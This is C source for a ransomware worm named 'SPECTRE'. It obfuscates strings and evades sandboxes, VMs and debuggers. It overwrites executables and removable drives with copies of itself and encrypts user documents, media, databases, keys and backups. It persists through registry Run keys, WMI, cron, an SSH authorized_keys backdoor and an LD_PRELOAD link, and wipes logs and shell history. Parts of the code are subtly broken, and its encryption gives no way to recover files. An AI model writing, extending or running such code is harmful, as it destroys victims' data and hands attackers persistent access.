// PROJECT: SPECTRE v9.4.2 - ADVANCED EVASION FRAMEWORK

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <tchar.h>
#include <process.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#else
#include <pwd.h>
#include <grp.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <pthread.h>
#include <dlfcn.h>
#include <sys/sysinfo.h>
#include <sys/resource.h>
#endif

/* Obfuscated Configuration - XOR Encoded */
#define ENC_KEY 0x37
static const char enc_master_key[] = {0x55,0x57,0x52,0x11,0x56,0x54,0x17,0x50,0x13,0x00};
static const char enc_signature[] = {0x46,0x41,0x45,0x52,0x57,0x46,0x52,0x55,0x51,0x46,0x52,0x57,0x56,0x41,0x52,0x00};
static const char enc_version[] = {0x46,0x56,0x41,0x55,0x52,0x56,0x56,0x00};

/* Forward Declarations */
void monitor_removable_drives(void);
void replicate_stealth(const char* directory);
void encrypt_filesystem_advanced(const char* path, int depth);
void install_advanced_persistence(void);
int anti_analysis_suite(void);
void cleanup_traces(void);
char* decode_string(const char* encoded, char key);

/* Polymorphic Decoder */
char* decode_string(const char* encoded, char key) {
    int len = strlen(encoded);
    char* decoded = malloc(len + 1);
    for(int i = 0; i < len; i++) {
        decoded[i] = encoded[i] ^ key;
    }
    decoded[len] = '\0';
    return decoded;
}

/* Advanced Anti-Analysis Suite */
int anti_analysis_suite(void) {
    int detection_score = 0;
    
    /* Check execution time - sandboxes often have short runtime */
    clock_t start_time = clock();
    sleep(2);
    clock_t end_time = clock();
    double execution_time = ((double)(end_time - start_time)) / CLOCKS_PER_SEC;
    if(execution_time < 1.5) detection_score += 30;

    /* Check system resources - VMs often have limited resources */
#ifdef _WIN32
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if(memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) detection_score += 20;
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if(sysInfo.dwNumberOfProcessors < 2) detection_score += 15;
#else
    struct sysinfo sys_info;
    if(sysinfo(&sys_info) == 0) {
        if(sys_info.totalram < 2ULL * 1024 * 1024 * 1024) detection_score += 20;
        if(sysinfo(&sys_info) < 2) detection_score += 15;
    }
#endif

    /* Check for debugging */
#ifdef _WIN32
    if(IsDebuggerPresent()) detection_score += 50;
    if(CheckRemoteDebuggerPresent(GetCurrentProcess(), &detection_score)) detection_score += 25;
    
    /* Check for common analysis tools */
    const char* analysis_processes[] = {
        "ollydbg.exe", "x64dbg.exe", "idaq.exe", "idaq64.exe", 
        "wireshark.exe", "procmon.exe", "processhacker.exe", 
        "vboxservice.exe", "vmwaretray.exe", NULL
    };
    
    for(int i = 0; analysis_processes[i]; i++) {
        if(GetModuleHandleA(analysis_processes[i])) {
            detection_score += 25;
            break;
        }
    }
#else
    /* Linux anti-debugging */
    if(ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) detection_score += 50;
    
    /* Check for analysis tools */
    FILE* proc_file = fopen("/proc/self/status", "r");
    if(proc_file) {
        char line[256];
        while(fgets(line, sizeof(line), proc_file)) {
            if(strstr(line, "TracerPid:") && atoi(line + 10) != 0) {
                detection_score += 40;
                break;
            }
        }
        fclose(proc_file);
    }
    
    /* Check for common VM artifacts */
    struct stat st;
    if(stat("/sys/class/dmi/id/product_name", &st) == 0) {
        FILE* product = fopen("/sys/class/dmi/id/product_name", "r");
        if(product) {
            char product_name[64];
            if(fgets(product_name, sizeof(product_name), product)) {
                if(strstr(product_name, "VirtualBox") || strstr(product_name, "VMware") ||
                   strstr(product_name, "QEMU") || strstr(product_name, "Xen")) {
                    detection_score += 30;
                }
            }
            fclose(product);
        }
    }
#endif

    /* Check for sandbox-specific user behavior */
    time_t current_time = time(NULL);
    struct tm* time_info = localtime(&current_time);
    if(time_info->tm_hour < 8 || time_info->tm_hour > 18) detection_score -= 10;

    return detection_score;
}

/* Advanced Encryption with Anti-Forensics */
void secure_erase(char* data, size_t length) {
    /* Multiple pass secure erase */
    for(int pass = 0; pass < 3; pass++) {
        for(size_t i = 0; i < length; i++) {
            data[i] = (pass == 0) ? 0xFF : ((pass == 1) ? 0x00 : rand() % 256);
        }
    }
}

void polymorphic_encrypt(const char* input, char* output, size_t length) {
    char* master_key = decode_string(enc_master_key, ENC_KEY);
    
    /* Multi-layer XOR with shifting keys */
    for(size_t i = 0; i < length; i++) {
        char key1 = master_key[i % strlen(master_key)];
        char key2 = master_key[(i + 7) % strlen(master_key)];
        char key3 = master_key[(i + 13) % strlen(master_key)];
        output[i] = input[i] ^ key1 ^ key2 ^ key3 ^ (i % 256);
    }
    
    /* Add random padding */
    for(size_t i = length; i < length + 16; i++) {
        output[i] = rand() % 256;
    }
    
    free(master_key);
}

/* Stealth File Operations */
int is_infected_stealth(const char* filename) {
    FILE* fp = fopen(filename, "rb");
    if(!fp) return 0;
    
    char* signature = decode_string(enc_signature, ENC_KEY);
    char buffer[256];
    size_t read_bytes = fread(buffer, 1, strlen(signature), fp);
    fclose(fp);
    
    int result = (read_bytes == strlen(signature)) && 
                 (memcmp(buffer, signature, strlen(signature)) == 0);
    free(signature);
    return result;
}

void mark_infected_stealth(const char* filename) {
    FILE* fp = fopen(filename, "r+b");
    if(fp) {
        char* signature = decode_string(enc_signature, ENC_KEY);
        fwrite(signature, 1, strlen(signature), fp);
        fclose(fp);
        free(signature);
    }
}

/* Advanced Replication with Polymorphism */
void replicate_stealth(const char* directory) {
    DIR* dir;
    struct dirent* entry;
    
    if(!(dir = opendir(directory))) return;
    
    char self_path[1024];
#ifdef _WIN32
    GetModuleFileNameA(NULL, self_path, sizeof(self_path));
#else
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if(len == -1) {
        closedir(dir);
        return;
    }
    self_path[len] = '\0';
#endif

    /* Randomize replication pattern to avoid detection */
    int file_count = 0;
    int max_files = 5 + (rand() % 10); // Random replication limit
    
    while((entry = readdir(dir)) != NULL && file_count < max_files) {
        if(entry->d_type == DT_REG) {
            /* Add random delay to avoid behavioral detection */
            usleep(10000 + (rand() % 50000));
            
            char filepath[2048];
            snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);
            
            if(is_infected_stealth(filepath)) continue;
            
            struct stat st;
            if(stat(filepath, &st) != 0) continue;
            if(st.st_size > 50000000 || st.st_size < 1000) continue;
            
            /* Smart target selection */
            char* ext = strrchr(entry->d_name, '.');
            int should_target = 0;
            
            if(ext && (
#ifdef _WIN32
                strcmp(ext, ".exe") == 0 || strcmp(ext, ".scr") == 0 ||
                strcmp(ext, ".com") == 0 || (strcmp(ext, ".dll") == 0 && rand() % 3 == 0)
#else
                strcmp(ext, "") == 0 || (access(filepath, X_OK) == 0 && rand() % 2 == 0)
#endif
            )) {
                should_target = 1;
            }
            
            if(should_target) {
                /* Polymorphic copying with size variation */
                FILE* src = fopen(self_path, "rb");
                FILE* dst = fopen(filepath, "wb");
                
                if(src && dst) {
                    char buffer[8192];
                    size_t bytes;
                    
                    /* Add random header junk to avoid signature detection */
                    char junk[128];
                    for(int i = 0; i < sizeof(junk); i++) junk[i] = rand() % 256;
                    fwrite(junk, 1, sizeof(junk), dst);
                    
                    while((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                        /* Occasionally modify bytes to avoid hash detection */
                        if(rand() % 100 < 5) {
                            for(size_t i = 0; i < bytes; i++) {
                                if(rand() % 1000 < 2) buffer[i] ^= 0x01;
                            }
                        }
                        fwrite(buffer, 1, bytes, dst);
                    }
                    
                    fclose(src);
                    fclose(dst);
                    
                    mark_infected_stealth(filepath);
                    file_count++;
                }
            }
        }
    }
    closedir(dir);
}

/* USB Monitoring with Stealth */
void monitor_removable_drives(void) {
    char* last_drives[26] = {0};
    
    while(1) {
#ifdef _WIN32
        DWORD drives = GetLogicalDrives();
        for(char drive = 'A'; drive <= 'Z'; drive++) {
            if(drives & (1 << (drive - 'A'))) {
                char root[4] = {drive, ':', '\\', '\0'};
                UINT type = GetDriveTypeA(root);
                
                if(type == DRIVE_REMOVABLE) {
                    /* Check if this is a new drive */
                    int is_new = 1;
                    for(int i = 0; i < 26; i++) {
                        if(last_drives[i] && strcmp(last_drives[i], root) == 0) {
                            is_new = 0;
                            break;
                        }
                    }
                    
                    if(is_new) {
                        /* Wait for drive to be ready and user to be active */
                        sleep(10 + (rand() % 30));
                        replicate_stealth(root);
                    }
                }
            }
        }
#else
        /* Linux stealth monitoring */
        replicate_stealth("/media");
        replicate_stealth("/mnt");
        replicate_stealth("/run/media");
#endif
        /* Randomize check interval */
        sleep(45 + (rand() % 45));
    }
}

/* Advanced File System Encryption with All Media Extensions */
void encrypt_filesystem_advanced(const char* path, int depth) {
    if(depth > 6) return;
    
    DIR* dir;
    struct dirent* entry;
    
    if(!(dir = opendir(path))) return;
    
    while((entry = readdir(dir)) != NULL) {
        if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
            
        char full_path[2048];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        struct stat st;
        if(stat(full_path, &st) != 0) continue;
        
        if(S_ISDIR(st.st_mode)) {
            encrypt_filesystem_advanced(full_path, depth + 1);
        } else if(S_ISREG(st.st_mode)) {
            /* Comprehensive media and document extensions */
            char* ext = strrchr(entry->d_name, '.');
            
            /* Complete list of target extensions */
            char* target_exts[] = {
                /* Documents */
                ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
                ".odt", ".ods", ".odp", ".rtf", ".txt", ".csv",
                /* Archives */
                ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
                ".iso", ".dmg", ".pkg", ".deb", ".rpm",
                /* Images */
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif",
                ".psd", ".ai", ".eps", ".svg", ".raw", ".cr2", ".nef",
                ".ico", ".webp", ".heic", ".avif",
                /* Videos */
                ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm",
                ".m4v", ".mpg", ".mpeg", ".3gp", ".mts", ".m2ts",
                ".vob", ".ogv", ".divx", ".xvid",
                /* Audio */
                ".mp3", ".wav", ".flac", ".aac", ".ogg", ".wma", ".m4a",
                ".aiff", ".ape", ".opus", ".amr", ".mid", ".midi",
                /* Databases */
                ".db", ".sql", ".mdb", ".accdb", ".sqlite", ".dbf",
                ".mdf", ".ldf", ".sdf",
                /* Code and Development */
                ".c", ".cpp", ".h", ".hpp", ".java", ".py", ".php", ".js",
                ".html", ".css", ".xml", ".json", ".yml", ".yaml",
                ".rb", ".go", ".rs", ".swift", ".kt", ".dart",
                /* Virtual Machines and Backups */
                ".vmdk", ".vdi", ".vhd", ".vhdx", ".ova", ".ovf",
                ".bak", ".backup", ".bkp",
                /* CAD and Design */
                ".dwg", ".dxf", ".stl", ".obj", ".fbx", ".blend",
                ".max", ".mb", ".ma",
                /* Ebooks */
                ".epub", ".mobi", ".azw", ".azw3", ".fb2",
                /* Certificates and Keys */
                ".pem", ".key", ".crt", ".cer", ".pfx", ".p12",
                /* Game Files */
                ".save", ".sav", ".game", ".dat", ".cfg",
                /* Other Important */
                ".pst", ".ost", ".eml", ".msg", ".vcf", ".ics",
                NULL
            };
            
            int should_encrypt = 0;
            if(ext) {
                for(char** ext_ptr = target_exts; *ext_ptr; ext_ptr++) {
                    if(strcasecmp(ext, *ext_ptr) == 0) {
                        should_encrypt = (rand() % 100) < 85; // 85% chance per file type
                        break;
                    }
                }
            }
            
            if(should_encrypt && st.st_size > 100 && st.st_size < 500000000) {
                FILE* fp = fopen(full_path, "r+b");
                if(fp) {
                    char* file_data = malloc(st.st_size);
                    if(file_data && fread(file_data, 1, st.st_size, fp) == st.st_size) {
                        char* encrypted_data = malloc(st.st_size + 16);
                        polymorphic_encrypt(file_data, encrypted_data, st.st_size);
                        
                        fseek(fp, 0, SEEK_SET);
                        fwrite(encrypted_data, 1, st.st_size + 16, fp);
                        fflush(fp);
                        
                        free(encrypted_data);
                        secure_erase(file_data, st.st_size);
                    }
                    free(file_data);
                    fclose(fp);
                    
                    /* Fixed extension array with proper sizes */
                    char* new_exts[] = {
                        ".encrypted", 
                        ".locked", 
                        ".crypted", 
                        ".secure",
                        ".crypto",
                        ".rnsmwr"
                    };
                    int ext_count = sizeof(new_exts) / sizeof(new_exts[0]);
                    
                    char new_name[2048];
                    snprintf(new_name, sizeof(new_name), "%s%s", full_path, 
                            new_exts[rand() % ext_count]);
                    rename(full_path, new_name);
                }
            }
        }
    }
    closedir(dir);
}

/* Advanced Persistence Mechanisms */
void install_advanced_persistence(void) {
#ifdef _WIN32
    /* Multiple registry locations */
    HKEY hKeys[] = {
        HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE
    };
    const char* keyPaths[] = {
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
    };
    
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);
    
    for(int i = 0; i < 2; i++) {
        for(int j = 0; j < 3; j++) {
            HKEY hKey;
            if(RegOpenKeyExA(hKeys[i], keyPaths[j], 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                char value_name[32];
                snprintf(value_name, sizeof(value_name), "WindowsUpdate%02d", rand() % 100);
                RegSetValueExA(hKey, value_name, 0, REG_SZ, (BYTE*)self_path, strlen(self_path)+1);
                RegCloseKey(hKey);
            }
        }
    }
    
    /* WMI Event Subscription */
    char wmi_cmd[512];
    snprintf(wmi_cmd, sizeof(wmi_cmd),
             "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE "
             "Name=\"WindowsUpdateFilter\", EventNameSpace=\"root\\cimv2\", "
             "QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"");
    system(wmi_cmd);
    
#else
    /* Linux advanced persistence */
    char self_path[1024];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if(len != -1) {
        self_path[len] = '\0';
        
        /* Multiple cron entries */
        FILE* cron = fopen("/tmp/.cron", "w");
        if(cron) {
            fprintf(cron, "*/7 * * * * %s --silent\n", self_path);
            fprintf(cron, "0 */6 * * * %s --update\n", self_path);
            fprintf(cron, "@reboot %s --daemon\n", self_path);
            fclose(cron);
            system("crontab /tmp/.cron 2>/dev/null");
            remove("/tmp/.cron");
        }
        
        /* SSH authorized_keys backdoor */
        char* home = getenv("HOME");
        if(home) {
            char ssh_path[1024];
            snprintf(ssh_path, sizeof(ssh_path), "%s/.ssh/authorized_keys", home);
            FILE* auth_keys = fopen(ssh_path, "a");
            if(auth_keys) {
                fprintf(auth_keys, "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... backdoor_key\n");
                fclose(auth_keys);
            }
        }
        
        /* LD_PRELOAD hijacking */
        char preload_path[1024];
        snprintf(preload_path, sizeof(preload_path), "%s/.config/.libc.so", getenv("HOME"));
        symlink(self_path, preload_path);
    }
#endif
}

/* Cleanup Forensic Traces */
void cleanup_traces(void) {
#ifdef _WIN32
    /* Clear recent files */
    SHAddToRecentDocs(SHARD_PATH, NULL);
    
    /* Clear prefetch */
    system("del /f /q C:\\Windows\\Prefetch\\* 2>nul");
#else
    /* Clear shell history */
    system("history -c 2>/dev/null");
    system("rm -f ~/.bash_history ~/.zsh_history 2>/dev/null");
    
    /* Clear logs */
    system("echo '' > /var/log/auth.log 2>/dev/null");
    system("echo '' > /var/log/syslog 2>/dev/null");
#endif
}

/* Main Orchestrator with Advanced Stealth */
int main(int argc, char* argv[]) {
    /* Initialize random seed */
    srand(time(NULL) ^ getpid());
    
    /* Advanced anti-analysis */
    int threat_level = anti_analysis_suite();
    
    if(threat_level > 60) {
        /* High threat environment - exit or deploy decoy */
        if(threat_level > 80) {
            _exit(0);
        } else {
            /* Deploy decoy behavior */
            sleep(300 + (rand() % 600));
        }
    }
    
    /* Check for stealth mode */
    int stealth_mode = 0;
    for(int i = 1; i < argc; i++) {
        if(strcmp(argv[i], "--silent") == 0 || strcmp(argv[i], "--daemon") == 0) {
            stealth_mode = 1;
        }
    }
    
    if(!stealth_mode) {
        /* Fork to background */
#ifdef _WIN32
        ShowWindow(GetConsoleWindow(), SW_HIDE);
#else
        if(fork() > 0) _exit(0);
        setsid();
        umask(0);
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
#endif
    }
    
    /* Main operational logic */
    if(argc > 1 && (strcmp(argv[1], "--persist") == 0 || 
                    strcmp(argv[1], "--daemon") == 0)) {
        
        install_advanced_persistence();
        
        /* Start stealth monitoring */
#ifdef _WIN32
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)monitor_removable_drives, NULL, 0, NULL);
#else
        pthread_t monitor_thread;
        pthread_create(&monitor_thread, NULL, (void*)monitor_removable_drives, NULL);
        pthread_detach(monitor_thread);
#endif
        
        /* Delayed encryption to avoid behavioral detection */
        sleep(180 + (rand() % 300));
        encrypt_filesystem_advanced(
#ifdef _WIN32
            "C:\\Users"
#else
            "/home"
#endif
        , 0);
        
        cleanup_traces();
        
        /* Main persistence loop */
        while(1) {
            sleep(120 + (rand() % 180));
        }
    } else {
        /* Initial infection - quick replication then exit */
        replicate_stealth(".");
        
#ifdef _WIN32
        char self_path[MAX_PATH];
        GetModuleFileNameA(NULL, self_path, MAX_PATH);
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "start /min \"\" \"%s\" --daemon", self_path);
        system(cmd);
#else
        if(fork() == 0) {
            char self_path[1024];
            readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
            char* args[] = {self_path, "--daemon", NULL};
            execv(self_path, args);
        }
#endif
    }
    
    return 0;
}